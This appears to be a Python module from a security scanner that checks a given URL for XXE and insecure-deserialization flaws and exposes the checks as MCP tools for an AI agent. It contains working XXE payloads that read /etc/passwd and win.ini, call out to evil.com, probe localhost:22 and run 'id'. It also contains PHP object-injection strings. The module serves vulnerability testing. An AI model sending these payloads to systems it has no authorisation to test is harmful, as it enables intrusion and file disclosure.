#!/usr/bin/env python3
"""
漏洞检测工具 - 序列化类漏洞检测
包含: XXE、反序列化漏洞
"""
import base64
import logging
from urllib.parse import quote

from .._common import HAS_REQUESTS, get_verify_ssl

if HAS_REQUESTS:
    import requests

logger = logging.getLogger(__name__)


# ============ XXE检测 ============

XXE_PAYLOADS = [
    # 基础XXE
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
    # 参数实体XXE
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>""",
    # OOB XXE
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><root>&xxe;</root>""",
    # Windows路径
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>""",
    # 内部网络探测
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>""",
    # 利用expect协议
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>""",
    # PHP协议
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>""",
]

XXE_INDICATORS = [
    "root:", "daemon:", "bin:", "sys:", "nobody:",
    "[fonts]", "[extensions]", "for 16-bit app support",
    "cm9vdDo", "ZGFlbW9u",  # base64 encoded root:/daemon:
    "SSH-", "OpenSSH",
]


def xxe_detect(url: str, param: str = None, method: str = "POST") -> dict:
    """XXE检测 - XML外部实体注入漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    headers = {"Content-Type": "application/xml"}

    for payload in XXE_PAYLOADS:
        try:
            if method.upper() == "POST":
                resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=get_verify_ssl())
            else:
                test_url = f"{url}{'&' if '?' in url else '?'}{param or 'data'}={quote(payload)}"
                resp = requests.get(test_url, timeout=15, verify=get_verify_ssl())

            # 检查响应中是否有敏感信息泄露
            for indicator in XXE_INDICATORS:
                if indicator in resp.text:
                    vulns.append({
                        "type": "XXE",
                        "severity": "CRITICAL",
                        "payload": payload[:100] + "...",
                        "evidence": indicator,
                        "url": url
                    })
                    break

            # 检查是否有XML解析错误（可能存在XXE）
            xml_errors = ["xml parsing error", "xmlparseerror", "xml syntax error", "invalid xml"]
            if any(err in resp.text.lower() for err in xml_errors):
                vulns.append({
                    "type": "XXE (Potential)",
                    "severity": "MEDIUM",
                    "detail": "服务器存在XML解析错误，可能存在XXE",
                    "url": url
                })
                break

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "xxe_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "禁用DTD和外部实体解析",
            "使用安全的XML解析器配置",
            "升级XML解析库到最新版本",
            "使用JSON替代XML"
        ] if vulns else []
    }


# ============ 反序列化检测 ============

# Java反序列化标识
JAVA_MAGIC_BYTES = b"\xac\xed\x00\x05"
JAVA_MAGIC_BASE64 = "rO0ABX"

# PHP反序列化Payload
PHP_DESERIALIZE_PAYLOADS = [
    'O:8:"stdClass":0:{}',
    'a:1:{s:4:"test";s:4:"test";}',
    'O:17:"__PHP_Incomplete":0:{}',
    # POP链示例
    'O:4:"Test":1:{s:3:"cmd";s:2:"id";}',
]

# Python pickle危险标识
PYTHON_PICKLE_INDICATORS = [
    b"\x80\x04\x95",  # Protocol 4
    b"\x80\x05\x95",  # Protocol 5
    "pickle",
    "unpickle",
    "__reduce__",
]

# .NET反序列化
DOTNET_INDICATORS = [
    "TypeConfuseDelegate",
    "ObjectDataProvider",
    "System.Data.DataSet",
    "System.Windows.Data.ObjectDataProvider",
]


def deserialize_detect(url: str, param: str = None, method: str = "POST") -> dict:
    """反序列化漏洞检测 - Java/PHP/Python/NET反序列化检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    findings = []

    # 1. 检查响应中是否有序列化数据
    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        
        # Java序列化检查
        if JAVA_MAGIC_BASE64 in resp.text:
            findings.append({
                "type": "Java Serialized Data",
                "severity": "HIGH",
                "detail": "响应中包含Java序列化数据"
            })

        # 检查Cookie中的序列化数据
        for cookie_name, cookie_value in resp.cookies.items():
            if JAVA_MAGIC_BASE64 in cookie_value:
                findings.append({
                    "type": "Java Serialized Cookie",
                    "severity": "HIGH",
                    "cookie": cookie_name,
                    "detail": "Cookie包含Java序列化数据"
                })

            # PHP序列化格式检查
            if cookie_value.startswith(("O:", "a:", "s:", "i:")):
                findings.append({
                    "type": "PHP Serialized Cookie",
                    "severity": "MEDIUM",
                    "cookie": cookie_name,
                    "detail": "Cookie可能包含PHP序列化数据"
                })

    except Exception:
        logger.warning("Suppressed exception", exc_info=True)

    # 2. PHP反序列化测试
    for payload in PHP_DESERIALIZE_PAYLOADS:
        try:
            if method.upper() == "POST":
                data = {param or "data": payload}
                resp = requests.post(url, data=data, timeout=10, verify=get_verify_ssl())
            else:
                test_url = f"{url}{'&' if '?' in url else '?'}{param or 'data'}={quote(payload)}"
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

            # 检查错误信息
            php_errors = [
                "unserialize()", "__wakeup", "__destruct", 
                "Serialization of", "allowed classes"
            ]
            for error in php_errors:
                if error in resp.text:
                    vulns.append({
                        "type": "PHP Deserialization",
                        "severity": "HIGH",
                        "payload": payload,
                        "evidence": error,
                        "url": url
                    })
                    break

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    # 3. Java反序列化测试
    try:
        # 构造畸形的Java序列化数据测试
        java_test_payload = base64.b64encode(JAVA_MAGIC_BYTES + b"test").decode()
        
        if method.upper() == "POST":
            data = {param or "data": java_test_payload}
            headers = {"Content-Type": "application/x-java-serialized-object"}
            resp = requests.post(url, data=data, headers=headers, timeout=10, verify=get_verify_ssl())
        
            java_errors = [
                "InvalidClassException", "StreamCorruptedException",
                "ClassNotFoundException", "java.io.ObjectInputStream",
                "DeserializationException", "java.io.InvalidClassException"
            ]
            for error in java_errors:
                if error in resp.text:
                    vulns.append({
                        "type": "Java Deserialization",
                        "severity": "CRITICAL",
                        "evidence": error,
                        "detail": "服务器尝试反序列化Java对象",
                        "url": url
                    })
                    break

    except Exception:
        logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "serialization_findings": findings,
        "deserialize_vulns": vulns,
        "total": len(vulns) + len(findings),
        "recommendations": [
            "避免对不可信数据进行反序列化",
            "使用白名单验证反序列化类",
            "升级到安全的反序列化库版本",
            "使用JSON/XML等安全格式替代序列化"
        ] if (vulns or findings) else []
    }


# ============ MCP工具注册 ============

def register_serialization_tools(mcp) -> None:
    """注册序列化类检测工具到MCP服务器"""
    
    @mcp.tool()
    def xxe_detect_tool(url: str, param: str = None, method: str = "POST") -> dict:
        """XXE检测 - XML外部实体注入漏洞检测"""
        return xxe_detect(url, param, method)
    
    @mcp.tool()
    def deserialize_detect_tool(url: str, param: str = None, method: str = "POST") -> dict:
        """反序列化漏洞检测 - Java/PHP/Python/NET反序列化检测"""
        return deserialize_detect(url, param, method)
    
    logger.info("已注册序列化类漏洞检测工具: xxe, deserialize")


__all__ = [
    "xxe_detect",
    "deserialize_detect",
    "register_serialization_tools",
]